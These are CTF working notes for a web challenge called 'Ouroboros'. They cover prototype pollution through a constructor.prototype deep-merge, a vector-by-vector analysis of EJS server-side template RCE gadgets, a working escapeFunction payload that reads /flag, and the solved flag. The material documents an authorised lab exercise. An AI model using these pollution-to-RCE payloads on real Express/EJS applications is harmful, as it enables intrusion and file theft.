# Ouroboros CTF — hard facts (verified)

Target: https://ouroboros-<hash>.chall.hiddeninvestigations.net (instances expire ~20 min)
Flag format: hiCTF{...}
Auth: POST /api/login (form, username=anything, NO password) → sets cookie `sid` (httpOnly).
`lib.py` in this dir has login/cfg/prev/post against the live host H.

## App surface (complete — fuzzed)
- GET / /login /app (static-ish HTML)
- POST /api/login (sets sid)
- POST /api/logout
- POST /api/report/config body {"settings":{...}} → {"ok":true,"config":{...}}
- POST /api/report/preview body {"data":{...}} → raw HTML (rendered report) OR {"error":"render failed","detail":<ejs error>}
- static: /static/hictf.css /static/logo.png
Nothing else. No files/zip shipped with the challenge.

## Rendering
Server-side EJS. Fixed template (leaked via delimiter trick):
 <section class="report"><h1><%= title %></h1><small><%= footer %></small><div class="body"><%= body %></div><div class="computed"><%= computed %></div></section>
`computed` is a locals key set by the app; appears to always be ''.
Config DEFAULT = {"theme":"dark","accent":"#3d7bff","watermark":false,"footer":"Q3 report"} — GLOBAL singleton (shared across sessions, persists).
Preview uses locals title/body/footer. footer defaults to config.footer.

## Prototype Pollution — WORKS
- Deep-merge filters keys named `__proto__` (case-sensitive); `constructor`/`prototype` survive.
- Working payload: `{"settings":{"a":{"constructor":{"prototype":{KEY:VAL}}}}}`
- PP is global and persistent — affects all subsequent requests until process restart.

## EJS version analysis (LOCAL VERIFICATION against stock ejs@3.1.7)

### Own-property status on `ejs` exports — PROVEN
| Property | Own on exports? | PP reachable via exports fallback? |
|---|---|---|
| `localsName` | **YES** (`ejs.localsName = 'locals'`) | **NO** — own prop shadows PP |
| `openDelimiter` | **NO** (`undefined`, hasOwn=false) | **YES** — PP reaches Template |
| `closeDelimiter` | **NO** (`undefined`, hasOwn=false) | **YES** — PP reaches Template |
| `delimiter` | **NO** (`undefined`, hasOwn=false) | **YES** — PP reaches Template |
| `fileLoader` | **YES** (`fs.readFileSync`) | **NO** |
| `cache` | **YES** | **NO** |

### shallowCopyFromList — NO hasOwn check in 3.1.7 — PROVEN
`utils.shallowCopyFromList` uses `typeof from[p] != 'undefined'` (line 143, utils.js).
This includes inherited properties. PP `Object.prototype.X` → `data.X` (inherited) → copied to opts for ANY key in `_OPTS_PASSABLE_WITH_DATA`.

Passable list: `delimiter, scope, context, debug, compileDebug, client, _with, rmWhitespace, strict, filename, async`

### opts is null-prototype in 3.1.7 — PROVEN
```
opts.__proto__ === null: true (3.1.7)
opts.__proto__ === Object.prototype: true (3.1.6)
```

### RCE VECTOR STATUS

**1. PP outputFunctionName → BLOCKED**
- Status: BLOCKED by null-proto opts
- Evidence: EJS 3.1.6 → `ZZMARK` appears (RCE works, file read confirmed)
 EJS 3.1.7 → `ZZMARK` absent (opts is null-proto, PP can't reach)
- Live challenge confirmed: ZZMARK2 never appeared → EJS >= 3.1.7

**2. PP localsName injection → BLOCKED (TRIPLE-BLOCKED)**
- Block 1: `exports.localsName = 'locals'` IS an own property → PP can't reach via exports fallback
- Block 2: `_JS_IDENTIFIER` regex `/^[a-zA-Z_$][0-9a-zA-Z_$]*$/` rejects any non-identifier value
- Block 3: Even in client mode (fn called with 1 arg), the identifier check prevents code injection
- Evidence: PP `Object.prototype.localsName = 'HACKED'` → `ejs.localsName` still `'locals'`
 Direct opts `localsName = 'a, b=...'` → Error: "localsName is not a valid JS identifier."

**3. PP escapeFunction → BLOCKED**
- Not in passable list, reads from null-proto opts only
- Evidence: PP `Object.prototype.escapeFunction = 'INJECTED'` → no effect

**4. PP destructuredLocals → BLOCKED**
- Reads from null-proto opts only; each name validated by `_JS_IDENTIFIER`
- Evidence: PP `Object.prototype.destructuredLocals = ['title']` → no effect

**5. Delimiter manipulation → WORKS but NO code execution**
- PP `openDelimiter='X'` changes EJS open delimiter (confirmed on live instance — crashes with '{')
- PP `closeDelimiter` also reachable
- PP `delimiter` reachable via both data flow and exports fallback
- **Delimiter trick (open='=', delim='"')**: template `class="report"` etc. become eval tags
 - Expressions evaluated: `report`, `body`, `computed` (bare identifiers, values discarded)
 - No side effects, no file read, no RCE
- Evidence: compiled source shows `; report` / `; body` / `; computed` as expression statements

**6. client=true mode → WORKS but not exploitable alone**
- PP `Object.prototype.client = true` → flows via data → escapeFn inlined in source
- In client mode, `returnedFn = fn` (raw function), called with 1 arg → `fn(data)`
 - Parameters `escapeFn`, `include`, `rethrow` are undefined
 - `escapeFn` inlined from source; `rethrow` inlined if compileDebug
 - `include` is NOT inlined → undefined in function body
- Cannot combine with localsName injection (localsName is blocked)

**7. handleCache file read → BLOCKED**
- `ejs.render(template, data)` ALWAYS passes template → `hasTemplate = true`
- File loading only when `!hasTemplate` → never reached
- PP `cache=true` + `filename='/flag'` → template still used, file never read

**8. PP 'view options' → escapeFunction + client → RCE — PROVEN (LOCAL)**
- Status: **PROVEN** locally against Express 4.22.3 + EJS 3.1.7
- Requires: app uses `res.render` (Express view engine), NOT `ejs.render` directly
- Chain:
 1. PP `Object.prototype['view options'] = {client: true, escapeFunction: "PAYLOAD"}`
 2. Express `res.render` → `app.locals.settings` → `ejs.renderFile(path, data, cb)`
 3. EJS `renderFile` line 475: `data.settings['view options']` found via PP
 4. `shallowCopy(opts, viewOpts)` copies client+escapeFunction as OWN props on opts
 5. Template constructor: `hasOwnOnlyObject(opts)` preserves own props → survives null-proto!
 6. `options.escapeFunction = opts.escapeFunction` → our string (NO _JS_IDENTIFIER check!)
 7. Client mode: `src = 'escapeFn = escapeFn || ' + escapeFn.toString + ';'` → string.toString = string → INJECTED
 8. `new Function(...)` compiles and executes our code
- PP payload: `{"settings":{"x":{"constructor":{"prototype":{"view options":{"client":true,"escapeFunction":"1; return process.mainModule.require('fs').readFileSync('/flag','utf8'); //"}}}}}}`
- Evidence:
 - Full chain test: /tmp/express-ejs-test/test-full-chain.js — PP via constructor.prototype → file read
 - Direct test: /tmp/express-ejs-test/test-exploit.js — confirms RCE, file read, cache bypass
 - Source inspection: /tmp/express-ejs-test/test-compiled-source.js — shows injected source:
 `function anonymous(locals, escapeFn, include, rethrow) { escapeFn = escapeFn || 1; return require("fs").readFileSync("/flag","utf8"); //; ... }`
 - The `return` exits before template body → response = flag contents
- Key insight: `escapeFunction` has NO regex validation (unlike `outputFunctionName` which has `_JS_IDENTIFIER` check)
- Limitation: ONLY works if app uses `res.render` / `ejs.renderFile`, NOT `ejs.render` directly

### PP properties that DO reach EJS Template constructor
Via data flow (passable): delimiter, scope, context, debug, compileDebug, client, _with, rmWhitespace, strict, filename, async
Via exports fallback: openDelimiter, closeDelimiter, (delimiter redundant)
Via renderFile 'view options' (IF app uses res.render): ANY property, including escapeFunction, client

## Tried and NEGATIVE (do not repeat)
- Config key SSTI / data value SSTI: ~200 keys set to `<%= 7*7 %>` → never yields 49
- File read via config/data values (theme/accent/watermark/footer/path/file/... = /etc/passwd|/flag) → nothing
- Command injection: ~140 keys set to `sleep 5` → no latency
- computed never non-empty via config/data/PP
- /static path traversal, /flag, /.env, /app.js, source maps: 404
- Express settings PP (settings/views/root/view engine/cache): no effect
- Username path traversal / admin usernames: nothing
- PP encoding → crashes body parser (500 on ALL POST endpoints); recoverable only by process restart

## NEEDS LIVE VERIFICATION
1. Run exploit.py against live instance to get the actual flag
2. The 'view options' chain is PROVEN locally but needs live confirmation
3. Flag path might be /flag, /flag.txt, /app/flag, etc. — exploit.py tries multiple paths
4. If res.render is NOT used, the exploit won't work — need fallback approach

## Exploit Summary
**PROVEN chain (local):** PP via `constructor.prototype` → `Object.prototype['view options']` → EJS `renderFile` picks up `{client: true, escapeFunction: "RCE_PAYLOAD"}` → `escapeFn.toString` inlines payload into compiled template source → arbitrary code execution → file read

**Exploit script:** `exploit.py` in this directory

## LIVE RE-TEST 2026-11-01 (instance ouroboros-47cc045610ae) — MAJOR CORRECTION
The documented "view options / res.render → escapeFunction RCE" chain DOES NOT WORK on the live app.
Proven live this session:
- Preview = `ejs.render(STRING_TEMPLATE, locals)` 2-arg. Errors show `ejs:1` (no filename) → NOT renderFile/res.render.
- EJS is >= 3.1.10 (CVE-2024-33883 hardening): `shallowCopyFromList` has hasOwn guard.
 * passable props (delimiter,scope,context,debug,compileDebug,client,_with,rmWhitespace,strict,filename,async)
 reach opts ONLY as OWN props of `data` (e.g. {"data":{...,"delimiter":"~"}} works); NOT via PP (inherited → hasOwn skips).
 * delimiter/openDelimiter/closeDelimiter ALSO reach via exports fallback (so PP delimiter works — harmless).
 * escapeFunction/outputFunctionName/localsName/destructuredLocals UNREACHABLE via PP OR data (null-proto opts; not passable; regex+own-export guards). Verified by direct live tests (no marker, no error).
- Pages / /app /login are STATIC res.send (polluting delimiter does NOT change them; zero `<%`). No res.render anywhere.
- `settings`+`view options` PP on routes → no RCE (no renderFile consumer).
- Config is INERT except footer (escaped value in <small>). No readFileSync sink via any branding key (theme/logo/watermark/bg/css/template/path/file... → /etc/hostname gave no change/no ENOENT).
- `computed` local is ALWAYS '' — not from config.computed, data.computed, headers, cookies, query, PP (own '' shadows). 
- No hidden routes; production mode (malformed JSON → plain "Bad Request", no stack); sid = 32-hex opaque (no forge).
- From EJS 3.1.10 source: only file-read sink is fileLoader guarded by !hasTemplate → unreachable (template always passed).

CONCLUSION: EJS SSPP→RCE is fully blocked by design. The flag path is NOT EJS. Leading untested hypothesis:
`computed` may be a server-side eval/Function(config.<key>) using PLAIN JS (prior tests only used EJS `<%=7*7%>` syntax, which is invalid JS and silently yields ''). NEXT: on a fresh instance, set config key = "6*7" (plain JS) and watch computed for "42"; also `${6*7}` template-literal injection.

## RESOLVED 2026-11-01 — the flag path was NOT EJS at all
SOLVED. Flag: hiCTF{pr0to_pollution_to_cust0m_new_Function_gadget_rce_d4d9ba5c06}

The hint's "computed may be eval(config key)" was RIGHT about eval, WRONG about the source:
`computed` is fed by `Function('data', view.formula)(locals)` where `view = {}` is a FRESH
object — so only **prototype** pollution (`Object.prototype.formula`) reaches it; config.formula
and data.formula are ignored. This is why every config/data sweep came back empty.
Full chain + recovered server.js: see WRITEUP.md and server.js.recovered.
